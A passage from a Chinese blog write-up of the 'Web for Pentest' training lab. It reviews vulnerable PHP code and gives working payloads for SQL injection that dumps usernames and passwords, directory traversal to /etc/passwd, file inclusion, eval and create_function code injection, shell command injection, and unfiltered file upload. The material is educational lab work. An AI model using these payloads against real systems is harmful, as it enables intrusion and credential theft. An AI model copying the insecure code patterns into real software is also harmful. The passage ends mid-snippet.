<p>这里可以看到<code>id=&#39;1abcd&#39;</code>强制转换成为1，并抛出告警，<code>id=abcd</code>强制转换成为0，因为查询不到id=0，所以没有数据返回，并且报错。<br>简单普及一下基础前提知识，就可以开干了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=-2 order by 5%23                                               //5列</span><br><span class="line">id=-2 union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA%23  //所有数据库名字</span><br><span class="line">id=-2 union select 1,2,database(),4,5%23 //当前数据库名为exercises</span><br><span class="line">id=-2 union select table_name,2,3,4,5 from  information_schema.tables%23    //猜解全部表名</span><br><span class="line">id=-2 union select table_name,2,3,4,5 from  information_schema.tables where table_schema= database()%23                   //当前数据库中的表名为users</span><br><span class="line">id=-2 union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where table_name = 0x7573657273%23                      //猜解列名</span><br><span class="line">id=-2 union select name,passwd,3,4,5 from exercises.users%23   //获取列中的值</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/16.png" alt="16"></p>
<h3 id="example5-1"><a href="#example5-1" class="headerlink" title="example5"></a>example5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[0-9]+/'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>); </span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>] ;</span><br></pre></td></tr></table></figure>
<p>这里的正则表达式要求通过id传入的数字必须为0-9。所以这题payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select name,passwd,3,4,5 from exercises.users%23   //获取列中的值</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/17.png" alt="17"></p>
<h3 id="example6-1"><a href="#example6-1" class="headerlink" title="example6"></a>example6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[0-9]+$/'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>); </span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>] ;</span><br></pre></td></tr></table></figure>
<p>这里的正则要求传入的参数id是以一个数字结尾，所以啊，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select name,passwd,3,4,5 from exercises.users%23 1</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/18.png" alt="18"></p>
<h3 id="example7-1"><a href="#example7-1" class="headerlink" title="example7"></a>example7</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^-?[0-9]+$/m'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>); </span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>];</span><br></pre></td></tr></table></figure>
<p>解释下这里正则的意思m是修饰符,默认的正则开始”<code>^</code>“和结束”<code>$</code>“只是对于正则字符串如果在修饰符中加上”<code>m</code>“， 那么开始和结束将会指字符串的每一行：每一行的开头就是”<code>^</code>“，结尾就是”<code>$</code>“。 <code>-?</code>表示可以没有或只有一个“<code>-</code>”号，在这里独立出来的话，没有意义，仅是字符而已。正则表达式表示开始和结束的字符串是一个数字，还分别匹配其中的换行符的之后和之前，所以我们可以在原语句中加入换行符所以我们可以绕过它采用换行符绕过，换行符\n的十六进制，就是%a0，在mysql中可以正常执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">2</span>%<span class="number">0</span>aunion%<span class="number">0</span>aselect%<span class="number">0</span>a1,name,passwd,<span class="number">4</span>,<span class="number">5</span>%<span class="number">0</span>afrom%<span class="number">0</span>ausers%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/19.png" alt="19"></p>
<h2 id="0x03-Directory-traversal"><a href="#0x03-Directory-traversal" class="headerlink" title="0x03 Directory traversal"></a>0x03 Directory traversal</h2><h3 id="example1-2"><a href="#example1-2" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$UploadDir = <span class="string">'/var/www/files/'</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])))</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line">$path = $UploadDir . $file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_file($path))</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">header(<span class="string">'Cache-Control: public'</span>);</span><br><span class="line">header(<span class="string">'Content-Disposition: inline; filename="'</span> . basename($path) . <span class="string">'";'</span>);</span><br><span class="line">header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">header(<span class="string">'Content-Length: '</span> . filesize($path));</span><br><span class="line"></span><br><span class="line">$handle = fopen($path, <span class="string">'rb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">$data = fread($handle, <span class="number">8192</span>);</span><br></pre></td></tr></table></figure>
<p>简单看看代码，<code>$UploadDir</code>定义了文件路径，然后通过get方式传入数据，并且与<code>$path</code>进行拼接，然后再由fopen打开文件，fread读取文件。</p>
<p>所以构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/20.png" alt="20"></p>
<h3 id="example2-2"><a href="#example2-2" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(strstr($file,<span class="string">"/var/www/files/"</span>)))</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_file($file))</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">header(<span class="string">'Cache-Control: public'</span>);</span><br><span class="line">header(<span class="string">'Content-Disposition: inline; filename="'</span> . basename($file) . <span class="string">'";'</span>);</span><br><span class="line">header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line"></span><br><span class="line">$handle = fopen($file, <span class="string">'rb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">$data = fread($handle, <span class="number">8192</span>);</span><br><span class="line"><span class="keyword">if</span> (strlen($data) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br></pre></td></tr></table></figure>
<p>代码解析下这里有个<code>strstr($file,&quot;/var/www/files/&quot;)</code>会判断file传入的数据中是否带有<code>/var/www/files/</code>，如果没有就会结束，所以啊，这里构造payload如下：</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/21.png" alt="21"></p>
<h3 id="example3-2"><a href="#example3-2" class="headerlink" title="example3"></a>example3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line">$path = $UploadDir . $file.<span class="string">".png"</span>;</span><br><span class="line"><span class="comment">// Simulate null-byte issue that used to be in filesystem related functions in PHP</span></span><br><span class="line">$path = preg_replace(<span class="string">'/\x00.*/'</span>,<span class="string">""</span>,$path);</span><br></pre></td></tr></table></figure>
<p>这段代码还是有趣，会将file传入的数据与<code>$uploaddir</code>以及<code>png</code>拼接后传递给<code>$path</code>，但是<code>$path</code>会进行正则操作，将<code>%00.</code>之后的数据替换为空，所以构造payload如下：</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/22.png" alt="22"></p>
<h2 id="0x04-File-Include"><a href="#0x04-File-Include" class="headerlink" title="0x04 File Include"></a>0x04 File Include</h2><h3 id="example1-3"><a href="#example1-3" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"page"</span>]) &#123;</span><br><span class="line">   <span class="keyword">include</span>($_GET[<span class="string">"page"</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个代码很简单理解，通过page参数传入数据，并且使用<code>include()</code>函数将其包含进来，我们在intro.php中写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/23.png" alt="23"></p>
<h3 id="example2-3"><a href="#example2-3" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"page"</span>]) &#123;</span><br><span class="line">   $file = $_GET[<span class="string">"page"</span>].<span class="string">".php"</span>;</span><br><span class="line">   <span class="comment">// simulate null byte issue</span></span><br><span class="line">   $file = preg_replace(<span class="string">'/\x00.*/'</span>,<span class="string">""</span>,$file);</span><br><span class="line">   <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里通过page传入数据，然后与<code>.php</code>拼接后传递给<code>$file</code>，这里的<code>$file</code>经过正则处理，将<code>%00.*</code>替换成空。所以payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.248.130/fileincl/example2.php?page=intro</span><br><span class="line">http://192.168.248.130/fileincl/example2.php?page=intro.php%00</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/24.png" alt="24"></p>
<h2 id="0x05-Code-injection"><a href="#0x05-Code-injection" class="headerlink" title="0x05 Code injection"></a>0x05 Code injection</h2><h3 id="example1-4"><a href="#example1-4" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  $str=<span class="string">"echo \"Hello "</span>.$_GET[<span class="string">'name'</span>].<span class="string">"!!!\";"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里通过name参数传入数据，使用了反斜杠<code>\</code>将echo后面的内容给转义了。这样做与加addslashes()函数进行过滤的意思是一样的。addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<br>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行  addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数  get_magic_quotes_gpc() 进行检测。</p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $hello"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这两个结果输出都是输出helloworld。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.248.130/codeexec/example1.php?name=$&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/25.png" alt="24"></p>
<h3 id="example2-4"><a href="#example2-4" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($order)) &#123; </span><br><span class="line">  usort($users, create_function(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.$order.<span class="string">',$b-&gt;'</span>.$order.<span class="string">');'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题函数在这里，<code>create_function</code>可以执行代码，举个例子。</p>
<h4 id="1-知识介绍"><a href="#1-知识介绍" class="headerlink" title="1. 知识介绍"></a>1. 知识介绍</h4><p>php函数 create_function()：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string create_function (string $args, string $code)</span><br><span class="line">string $args 变量部分</span><br><span class="line">string $code  方法代码部分</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$fname'</span>,<span class="string">'echo $fname."Zhang"'</span>)</span><br></pre></td></tr></table></figure>
<p> 类似于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($fname)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> $fname.<span class="string">"Zhang"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  举一个官方提供的例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-如何利用create-function-）代码注入"><a href="#2-如何利用create-function-）代码注入" class="headerlink" title="2. 如何利用create_function(）代码注入"></a>2. 如何利用create_function(）代码注入</h4><p>有问题的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//02-8.php?id=2;&#125;phpinfo();/*</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$str2=<span class="string">'echo  '</span>.$a.<span class="string">'test'</span>.$id.<span class="string">";"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str2;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"=============================="</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$f1 = create_function(<span class="string">'$a'</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"=============================="</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>实现的原理类似于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>.$a;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">注入后代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>;&#125;</span><br><span class="line">  phpinfo();<span class="comment">/*;//此处为注入代码。</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
<p>所以最后的payload如下：</p>
<figure class="highlight plain"><figcaption><span>r</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.248.130/codeexec/example2.php?order=id);&#125;phpinfo();//</span><br></pre></td></tr></table></figure>
<h3 id="example3-3"><a href="#example3-3" class="headerlink" title="example3"></a>example3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> preg_replace($_GET[<span class="string">"pattern"</span>], $_GET[<span class="string">"new"</span>], $_GET[<span class="string">"base"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在php正则下/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码。因此当满足了在语句的构造中有/e修正符，就有可能引起php代码注入的风险。可以如此构造<code>new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</code>所以构造如下：</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/26.png" alt="26"></p>
<h3 id="example4-2"><a href="#example4-2" class="headerlink" title="example4"></a>example4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(trim(<span class="string">"'"</span>.$_GET[<span class="string">'name'</span>].<span class="string">"'"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.htmlentities($_GET[<span class="string">'name'</span>]);</span><br></pre></td></tr></table></figure>
<p>我懒，不想讲如何构造，给个图，明白了吧。</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/27.png" alt="27"></p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/28.png" alt="28"></p>
<h2 id="0x06-Commands-injection"><a href="#0x06-Commands-injection" class="headerlink" title="0x06 Commands injection"></a>0x06 Commands injection</h2><p><strong>windows支持：</strong></p>
<ul>
<li>|           ping 127.0.0.1|whoami           </li>
<li>||         ping  2 || whoami （哪条名令为真执行那条）</li>
<li>&amp;  &amp;&amp;   ping 127.0.0.1&amp;&amp;whoami</li>
</ul>
<p><strong>Linux支持：</strong></p>
<ul>
<li>；      127.0.0.1;whoami  </li>
<li>|         127.0.0.1|whoami                    </li>
<li>||    1||whoami  （哪条名令为真执行那条）</li>
<li>&amp;&amp;     127.0.0.1&amp;&amp;whoami</li>
</ul>
<h3 id="example1-5"><a href="#example1-5" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  system(<span class="string">"ping -c 2 "</span>.$_GET[<span class="string">'ip'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个代码很简单，就是通过ip传入参数，然后使用system命令执行，所以payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.248.130/commandexec/example1.php?ip=127.0.0.1;id</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/29.png" alt="29"></p>
<h3 id="example2-5"><a href="#example2-5" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $_GET[<span class="string">'ip'</span>]))) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">"Invalid IP address"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"ping -c 2 "</span>.$_GET[<span class="string">'ip'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个正则表达式的意思是匹配数字，并且从头检查到尾巴，然后<code>/m</code>每行检查。然后很简单换行符号变成<code>%0a</code>就可以绕过了。payload：<code>?ip=127.0.0.1%0aid</code>。</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/30.png" alt="30"></p>
<h3 id="example3-4"><a href="#example3-4" class="headerlink" title="example3"></a>example3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/'</span>, $_GET[<span class="string">'ip'</span>]))) &#123;</span><br><span class="line">     header(<span class="string">"Location: example3.php?ip=127.0.0.1"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"ping -c 2 "</span>.$_GET[<span class="string">'ip'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码还是一样，但是这里如果ip不合法，直接重定向了，但还是执行了，可以使用curl</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/31.png" alt="31"></p>
<h2 id="0x07-File-Upload"><a href="#0x07-File-Upload" class="headerlink" title="0x07 File Upload"></a>0x07 File Upload</h2><h3 id="example1-6"><a href="#example1-6" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'image'</span>]))</span><br><span class="line">&#123; </span><br><span class="line">  $dir = <span class="string">'/var/www/upload/images/'</span>;</span><br><span class="line">  $file = basename($_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]);</span><br><span class="line">  <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>], $dir. $file))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Upload done"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Your file can be found &lt;a href=\"/upload/images/"</span>.htmlentities($file).<span class="string">"\"&gt;here&lt;/a&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">  &#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'Upload failed'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码很简单直接上传图片，没有任何过滤，并且将图片的位置名字直接输出。</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/32.png" alt="32"></p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/33.png" alt="33"></p>
<h3 id="example2-6"><a href="#example2-6" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'image'</span>]))</span><br><span class="line">&#123; </span><br><span class="line">  $dir = <span class="string">'/var/www/upload/images/'</span>;</span><br><span class="line">  $file = basename($_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]);</span><br><span class="line">   <span class="keyword">if</span> (preg_match(<span class="string">'/\.php$/'</span>,$file)) &#123;</span><br><span class="line">      <span class="keyword">DIE</span>(<span class="string">"NO PHP"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'image'</span>][<span 